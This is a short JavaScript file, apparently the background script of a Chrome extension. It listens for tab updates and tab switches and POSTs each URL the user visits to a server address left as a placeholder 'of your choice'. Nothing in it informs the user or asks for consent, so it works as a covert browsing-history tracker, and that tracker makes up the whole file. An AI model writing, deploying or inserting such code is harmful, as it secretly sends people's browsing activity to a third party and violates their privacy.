// Sends new URLs 
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
	sendData(changeInfo.url);
}); 

// Sends URLs as user switches between tabs
chrome.tabs.onActivated.addListener(function(activeInfo) {
	chrome.tabs.get(activeInfo.tabId, function(tab){
		sendData(tab.url);
	});
}); 
 
// Opens a connection to a server of your choice
function sendData(data){
	var xhttp = new XMLHttpRequest();
	xhttp.open('POST', '<Address of server goes here>', true);
	xhttp.send(data);
};